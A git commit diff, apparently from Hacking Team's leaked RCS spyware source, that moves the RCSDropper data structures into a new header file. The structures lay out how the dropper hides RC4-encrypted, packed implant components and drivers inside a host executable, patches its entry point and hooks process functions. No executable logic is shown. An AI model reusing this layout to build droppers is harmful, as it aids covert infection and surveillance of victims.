023130b69400be1336ca7ce38d4d861039c805be
Guido Landi <g.landi@hackingteam.it>
2012-12-13 12:09:12 +0100

    added include

--- RCSDropper/DropperCode.h
+++ RCSDropper/DropperCode.h
@@ -10,128 +10,15 @@
 #pragma optimize( "", off ) // *** Disable all optimizations - we need code "as is"!
 #pragma code_seg(".extcd")  // *** Lets put all functions in a separated code segment
 
+#include "DropperHeader.h"
+
+
 #define END_MARKER(ptr) do { memcpy(ptr, "<E>\0", 4); ptr += 4; } while(0)
 #define END_OF(x) #x ## "_End"
 #define FUNCTION_END_DECL(x) void x ## _End()
 #define FUNCTION_END(x) FUNCTION_END_DECL(x) { char * y = END_OF(x); return; }
 #define S_SWAP(a,b) do { unsigned char t = S[a]; S[a] = S[b]; S[b] = t; } while(0);
 
-
-#define RC4KEYLEN 64
-#define SBOX_SIZE 255
-#define APLIB_PACKED	0x00000001
-#define RC4_CRYPTED		0x00000002
-
-
-
-
-typedef struct _UNICODE_STRING {
-	USHORT Length;
-	USHORT MaximumLength;
-	PWSTR  Buffer;
-} UNICODE_STRING, *PUNICODE_STRING;
-
-
-typedef struct {
-	DWORD InLoadNext;
-	DWORD InLoadPrev;
-	DWORD InMemNext;
-	DWORD InMemPrev;
-	DWORD InInitNext;
-	DWORD InInitPrev;
-	DWORD ImageBase;
-	PVOID EntryPoint;
-	ULONG SizeOfImage;
-	UNICODE_STRING FullDllName;
-	UNICODE_STRING BaseDllName;
-} PEB_LIST_ENTRY, *PPEB_LIST_ENTRY;
-
-
-typedef struct _data_section_blob {
-	DWORD offset;
-	DWORD size;
-} DataSectionBlob;
-
-typedef struct _patch_blob {
-	DWORD VA;
-	DWORD offset;
-	DWORD size;
-} PatchBlob;
-
-typedef struct _data_section_cryptopack {
-	DWORD offset;
-	DWORD size;
-	DWORD original_size;
-	DWORD characteristics;
-} DataSectionCryptoPack;
-
-typedef struct _data_section_files {
-	struct {
-		DataSectionBlob core;
-		DataSectionBlob core64;
-		DataSectionBlob config;
-		DataSectionBlob driver;
-		DataSectionBlob driver64;
-		DataSectionBlob codec;
-		DataSectionBlob	bitmap;
-	} names;
-
-	DataSectionCryptoPack core;
-	DataSectionCryptoPack core64;
-	DataSectionCryptoPack config;
-	DataSectionCryptoPack driver;
-	DataSectionCryptoPack driver64;
-	DataSectionCryptoPack codec;
-	DataSectionCryptoPack bitmap;
-} DataSectionFiles;
-
-typedef void (*WINSTARTFUNC)(void);
-
-typedef  __declspec(align(4)) struct _data_section_header 
-{
-	// RC4
-	// Encryption key
-	CHAR rc4key[RC4KEYLEN];
-	// SBox
-	unsigned char gSBox[SBOX_SIZE + 1];
-
-	// OEP
-	WINSTARTFUNC   pfn_OriginalEntryPoint;
-
-	// Synchronization
-	DWORD synchro;
-
-	// used to pass full qualified path to core thread
-	CHAR *dllPath;
-
-	// our own functions
-	struct {
-		DataSectionBlob newEntryPoint;
-		DataSectionBlob coreThread;
-		DataSectionBlob dumpFile;
-		DataSectionBlob exitProcessHook;
-		DataSectionBlob GetCommandLineAHook;
-		DataSectionBlob GetCommandLineWHook;
-		DataSectionBlob rvaToOffset;
-		DataSectionBlob rc4;
-		DataSectionBlob hookCall;
-		DataSectionBlob load;
-	} functions;
-
-	DataSectionFiles files;
-
-	PatchBlob stage1;
-	PatchBlob stage2;
-
-	DataSectionBlob restore;
-
-	ULONG exeType;
-	BOOL isScout;
-
-	CHAR instDir[10];
-	CHAR fPrefix[8];
-	CHAR version[20];
-} DataSectionHeader;
 
 typedef FARPROC (WINAPI *GETPROCADDRESS)(HMODULE, LPCSTR);
 typedef HMODULE (WINAPI *LOADLIBRARY)(LPCSTR);
---
+++ RCSDropper/DropperHeader.h
@@ -0,0 +1,123 @@
+#ifndef _DROPPER_HEADER_H
+#define _DROPPER_HEADER_H
+
+#ifdef WIN32
+#include <Windows.h>
+#else
+#include "win32types.h"
+#endif
+
+#define RC4KEYLEN 64
+#define SBOX_SIZE 255
+#define APLIB_PACKED	0x00000001
+#define RC4_CRYPTED		0x00000002
+
+typedef struct _UNICODE_STRING {
+	USHORT Length;
+	USHORT MaximumLength;
+	PWSTR  Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+
+typedef struct {
+	DWORD InLoadNext;
+	DWORD InLoadPrev;
+	DWORD InMemNext;
+	DWORD InMemPrev;
+	DWORD InInitNext;
+	DWORD InInitPrev;
+	DWORD ImageBase;
+	PVOID EntryPoint;
+	ULONG SizeOfImage;
+	UNICODE_STRING FullDllName;
+	UNICODE_STRING BaseDllName;
+} PEB_LIST_ENTRY, *PPEB_LIST_ENTRY;
+
+
+typedef struct _data_section_blob {
+	DWORD offset;
+	DWORD size;
+} DataSectionBlob;
+
+typedef struct _patch_blob {
+	DWORD VA;
+	DWORD offset;
+	DWORD size;
+} PatchBlob;
+
+typedef struct _data_section_cryptopack {
+	DWORD offset;
+	DWORD size;
+	DWORD original_size;
+	DWORD characteristics;
+} DataSectionCryptoPack;
+
+typedef struct _data_section_files {
+	struct {
+		DataSectionBlob core;
+		DataSectionBlob core64;
+		DataSectionBlob config;
+		DataSectionBlob driver;
+		DataSectionBlob driver64;
+		DataSectionBlob codec;
+		DataSectionBlob	bitmap;
+	} names;
+
+	DataSectionCryptoPack core;
+	DataSectionCryptoPack core64;
+	DataSectionCryptoPack config;
+	DataSectionCryptoPack driver;
+	DataSectionCryptoPack driver64;
+	DataSectionCryptoPack codec;
+	DataSectionCryptoPack bitmap;
+} DataSectionFiles;
+
+typedef void (*WINSTARTFUNC)(void);
+
+typedef  __declspec(align(4)) struct _data_section_header 
+{
+	// RC4
+	// Encryption key
+	CHAR rc4key[RC4KEYLEN];
+	// SBox
+	unsigned char gSBox[SBOX_SIZE + 1];
+
+	// OEP
+	WINSTARTFUNC   pfn_OriginalEntryPoint;
+
+	// Synchronization
+	DWORD synchro;
+
+	// used to pass full qualified path to core thread
+	CHAR *dllPath;
+
+	// our own functions
+	struct {
+		DataSectionBlob newEntryPoint;
+		DataSectionBlob coreThread;
+		DataSectionBlob dumpFile;
+		DataSectionBlob exitProcessHook;
+		DataSectionBlob GetCommandLineAHook;
+		DataSectionBlob GetCommandLineWHook;
+		DataSectionBlob rvaToOffset;
+		DataSectionBlob rc4;
+		DataSectionBlob hookCall;
+		DataSectionBlob load;
+	} functions;
+
+	DataSectionFiles files;
+
+	PatchBlob stage1;
+	PatchBlob stage2;
+
+	DataSectionBlob restore;
+
+	ULONG exeType;
+	BOOL isScout;
+
+	CHAR instDir[10];
+	CHAR fPrefix[8];
+	CHAR version[20];
+} DataSectionHeader;
+
+#endif //_DROPPER_HEADER_H
